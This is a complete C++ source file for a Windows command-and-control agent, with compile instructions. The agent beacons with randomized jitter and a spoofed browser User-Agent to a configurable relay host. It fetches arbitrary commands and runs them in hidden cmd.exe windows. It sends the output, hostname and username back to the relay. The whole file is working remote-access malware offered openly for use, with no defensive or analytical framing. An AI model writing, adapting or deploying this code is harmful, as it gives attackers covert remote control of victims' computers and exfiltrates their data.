/*
 * C2 Agent — C++ (Windows Native)
 *
 * Zero external dependencies. Uses WinHTTP for comms and native APIs for everything else.
 *
 * Compile (MSVC):
 *    cl /EHsc /O2 agent.cpp /Fe:agent.exe winhttp.lib
 *
 * Compile (MinGW / g++):
 *    g++ -o agent.exe agent.cpp -lwinhttp -lws2_32 -static
 *
 * Features:
 *    - Beacons to relay server at randomized intervals
 *    - Fetches and executes commands
 *    - Sends output back to relay
 *    - Consistent agent ID from machine info
 *    - Spoofed User-Agent
 */

#define _CRT_SECURE_NO_WARNINGS
#include <winsock2.h>
#include <windows.h>
#include <winhttp.h>
#include <lmcons.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <string>
#include <sstream>
#include <vector>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")

// ══════════════════════════════════════════════════
// CONFIGURATION
// ══════════════════════════════════════════════════

// Relay server (the public-facing relay, NOT the C2 directly)
#define RELAY_HOST      L"RELAY_SERVER_IP"      // Change this
#define RELAY_PORT      8443
#define USE_HTTPS       FALSE                    // Set TRUE if relay uses HTTPS

// Auth token for the relay (must match relay_server.py RELAY_AUTH_TOKEN)
#define RELAY_TOKEN     "CHANGE_ME_RELAY_SECRET"

// Beacon interval range in seconds (randomized)
#define BEACON_MIN      5
#define BEACON_MAX      15

// Command execution timeout (milliseconds)
#define CMD_TIMEOUT_MS  60000

// Max output buffer size
#define MAX_OUTPUT      65536

// User-Agent string (blend in with normal traffic)
#define USER_AGENT      L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"


// ══════════════════════════════════════════════════
// UTILITY: Simple JSON helpers (no library needed)
// ══════════════════════════════════════════════════

// Extract a string value from JSON by key (basic, handles simple flat JSON)
std::string json_get(const std::string& json, const std::string& key) {
    std::string search = "\"" + key + "\"";
    size_t pos = json.find(search);
    if (pos == std::string::npos) return "";

    // Find the colon after the key
    pos = json.find(':', pos + search.length());
    if (pos == std::string::npos) return "";
    pos++;

    // Skip whitespace
    while (pos < json.length() && (json[pos] == ' ' || json[pos] == '\t')) pos++;

    if (pos >= json.length()) return "";

    // Check if value is a string (quoted)
    if (json[pos] == '"') {
        pos++; // skip opening quote
        std::string result;
        while (pos < json.length() && json[pos] != '"') {
            if (json[pos] == '\\' && pos + 1 < json.length()) {
                pos++; // skip escape char
                switch (json[pos]) {
                    case 'n': result += '\n'; break;
                    case 't': result += '\t'; break;
                    case '\\': result += '\\'; break;
                    case '"': result += '"'; break;
                    default: result += json[pos]; break;
                }
            } else {
                result += json[pos];
            }
            pos++;
        }
        return result;
    }

    // Non-string value (number, bool, null)
    std::string result;
    while (pos < json.length() && json[pos] != ',' && json[pos] != '}' && json[pos] != ' ') {
        result += json[pos];
        pos++;
    }
    return result;
}

// Escape a string for JSON
std::string json_escape(const std::string& s) {
    std::string result;
    for (char c : s) {
        switch (c) {
            case '"':  result += "\\\""; break;
            case '\\': result += "\\\\"; break;
            case '\n': result += "\\n";  break;
            case '\r': result += "\\r";  break;
            case '\t': result += "\\t";  break;
            default:   result += c;      break;
        }
    }
    return result;
}

// Build a JSON object from key-value pairs
std::string json_build(const std::vector<std::pair<std::string, std::string>>& pairs) {
    std::string json = "{";
    for (size_t i = 0; i < pairs.size(); i++) {
        if (i > 0) json += ",";
        json += "\"" + pairs[i].first + "\":\"" + json_escape(pairs[i].second) + "\"";
    }
    json += "}";
    return json;
}


// ══════════════════════════════════════════════════
// SYSTEM INFO
// ══════════════════════════════════════════════════

std::string get_hostname() {
    char buf[256] = {0};
    DWORD size = sizeof(buf);
    GetComputerNameA(buf, &size);
    return std::string(buf);
}

std::string get_username() {
    char buf[UNLEN + 1] = {0};
    DWORD size = UNLEN + 1;
    GetUserNameA(buf, &size);
    return std::string(buf);
}

std::string get_os_info() {
    OSVERSIONINFOA osvi;
    ZeroMemory(&osvi, sizeof(osvi));
    osvi.dwOSVersionInfoSize = sizeof(osvi);

    // Get architecture
    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);
    std::string arch = (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) ? "x64" : "x86";

    std::ostringstream os;
    os << "Windows " << arch;
    return os.str();
}

// Generate consistent agent ID from machine properties
std::string generate_agent_id() {
    std::string raw = get_hostname() + "-" + get_username();

    // Simple hash (djb2)
    unsigned long hash = 5381;
    for (char c : raw) {
        hash = ((hash << 5) + hash) + c;
    }

    char id[13];
    snprintf(id, sizeof(id), "%08lx", hash);
    return std::string(id);
}

std::string get_timestamp() {
    time_t now = time(NULL);
    struct tm t;
    localtime_s(&t, &now);
    char buf[32];
    strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M:%S", &t);
    return std::string(buf);
}


// ══════════════════════════════════════════════════
// COMMAND EXECUTION
// ══════════════════════════════════════════════════

std::string execute_command(const std::string& command) {
    if (command.empty()) return "";

    // Create pipes for stdout/stderr capture
    HANDLE hReadPipe, hWritePipe;
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        return "[ERROR] Failed to create pipe";
    }

    // Don't let the read end be inherited
    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

    // Build command line: cmd.exe /C <command>
    std::string cmd_line = "cmd.exe /C " + command;
    char cmd_buf[4096];
    strncpy_s(cmd_buf, sizeof(cmd_buf), cmd_line.c_str(), _TRUNCATE);

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.wShowWindow = SW_HIDE;  // Hidden window

    BOOL success = CreateProcessA(
        NULL,
        cmd_buf,
        NULL, NULL,
        TRUE,           // Inherit handles
        CREATE_NO_WINDOW,
        NULL, NULL,
        &si, &pi
    );

    if (!success) {
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return "[ERROR] Failed to execute command";
    }

    // Close write end in parent so ReadFile will return when child exits
    CloseHandle(hWritePipe);

    // Wait for process with timeout
    DWORD wait_result = WaitForSingleObject(pi.hProcess, CMD_TIMEOUT_MS);

    // Read output
    std::string output;
    char buffer[4096];
    DWORD bytesRead;

    while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        output += buffer;
        if (output.length() > MAX_OUTPUT) {
            output += "\n[TRUNCATED]";
            break;
        }
    }

    if (wait_result == WAIT_TIMEOUT) {
        TerminateProcess(pi.hProcess, 1);
        output += "\n[ERROR] Command timed out";
    }

    CloseHandle(hReadPipe);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    // Trim trailing whitespace
    while (!output.empty() && (output.back() == '\n' || output.back() == '\r' || output.back() == ' ')) {
        output.pop_back();
    }

    return output;
}


// ══════════════════════════════════════════════════
// HTTP COMMUNICATION (WinHTTP)
// ══════════════════════════════════════════════════

// Perform an HTTP request and return response body
std::string http_request(const std::wstring& method, const std::wstring& path,
                         const std::string& body = "") {

    HINTERNET hSession = WinHttpOpen(
        USER_AGENT,
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );

    if (!hSession) return "";

    HINTERNET hConnect = WinHttpConnect(
        hSession,
        RELAY_HOST,
        RELAY_PORT,
        0
    );

    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return "";
    }

    DWORD flags = USE_HTTPS ? WINHTTP_FLAG_SECURE : 0;

    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        method.c_str(),
        path.c_str(),
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        flags
    );

    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return "";
    }

    // Build auth + content-type headers

    // Build proper header from the #define
    std::string token_narrow = RELAY_TOKEN;
    std::wstring token_wide(token_narrow.begin(), token_narrow.end());
    std::wstring header = L"X-Relay-Token: " + token_wide + L"\r\nContent-Type: application/json";

    WinHttpAddRequestHeaders(hRequest, header.c_str(), -1, WINHTTP_ADDREQ_FLAG_ADD);

    // Send request
    BOOL result;
    if (body.empty()) {
        result = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                     WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    } else {
        result = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                     (LPVOID)body.c_str(), (DWORD)body.length(),
                                     (DWORD)body.length(), 0);
    }

    if (!result) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return "";
    }

    WinHttpReceiveResponse(hRequest, NULL);

    // Read response
    std::string response;
    DWORD bytesAvailable = 0;
    DWORD bytesRead = 0;
    char buf[4096];

    do {
        bytesAvailable = 0;
        WinHttpQueryDataAvailable(hRequest, &bytesAvailable);
        if (bytesAvailable == 0) break;

        DWORD toRead = min(bytesAvailable, (DWORD)sizeof(buf) - 1);
        ZeroMemory(buf, sizeof(buf));
        WinHttpReadData(hRequest, buf, toRead, &bytesRead);
        response.append(buf, bytesRead);
    } while (bytesAvailable > 0);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return response;
}


// ══════════════════════════════════════════════════
// BEACON & REPORT
// ══════════════════════════════════════════════════

struct BeaconResult {
    std::string command;
    std::string task_id;
    bool success;
};

BeaconResult beacon(const std::string& agent_id) {
    BeaconResult result = {"", "", false};

    // Build path: /beacon?agent_id=xxx
    std::string path_narrow = "/beacon?agent_id=" + agent_id;
    std::wstring path(path_narrow.begin(), path_narrow.end());

    std::string response = http_request(L"GET", path);
    if (response.empty()) return result;

    result.command = json_get(response, "command");
    result.task_id = json_get(response, "task_id");
    result.success = true;

    return result;
}

bool send_report(const std::string& agent_id, const std::string& task_id,
                 const std::string& output, const std::string& hostname,
                 const std::string& username, const std::string& os_info) {

    std::string body = json_build({
        {"agent_id",  agent_id},
        {"task_id",   task_id},
        {"output",    output},
        {"hostname",  hostname},
        {"username",  username},
        {"os",        os_info},
        {"timestamp", get_timestamp()}
    });

    std::string response = http_request(L"POST", L"/report", body);
    if (response.empty()) return false;

    std::string status = json_get(response, "status");
    return (status == "success");
}


// ══════════════════════════════════════════════════
// MAIN
// ══════════════════════════════════════════════════

int main() {
    // Seed random for jitter
    srand((unsigned int)time(NULL) ^ GetCurrentProcessId());

    // Gather identity
    std::string agent_id = generate_agent_id();
    std::string hostname = get_hostname();
    std::string username = get_username();
    std::string os_info  = get_os_info();

    printf("[*] Agent ID: %s\n", agent_id.c_str());
    printf("[*] System:   %s\n", os_info.c_str());
    printf("[*] User:     %s@%s\n", username.c_str(), hostname.c_str());
    printf("[*] Beacon:   %d-%ds jitter\n\n", BEACON_MIN, BEACON_MAX);

    // Initial check-in
    send_report(agent_id, "initial_checkin", "Agent started (C++)", hostname, username, os_info);

    int fail_count = 0;

    while (true) {
        // Beacon to relay
        BeaconResult br = beacon(agent_id);

        if (br.success && !br.command.empty()) {
            fail_count = 0;
            printf("[+] Command (task %s): %s\n", br.task_id.c_str(), br.command.c_str());

            // Execute
            std::string output = execute_command(br.command);
            printf("[+] Output: %.200s...\n", output.c_str());

            // Report back
            bool sent = send_report(agent_id, br.task_id, output, hostname, username, os_info);
            printf(sent ? "[+] Report sent\n" : "[-] Report failed\n");

        } else if (!br.success) {
            fail_count++;
            printf("[-] Beacon failed (%d)\n", fail_count);

            if (fail_count >= 5) {
                printf("[-] Backing off +30s\n");
                Sleep(30000);
            }
        }

        // Sleep with jitter
        int sleep_sec = BEACON_MIN + (rand() % (BEACON_MAX - BEACON_MIN + 1));
        Sleep(sleep_sec * 1000);
    }

    return 0;
}
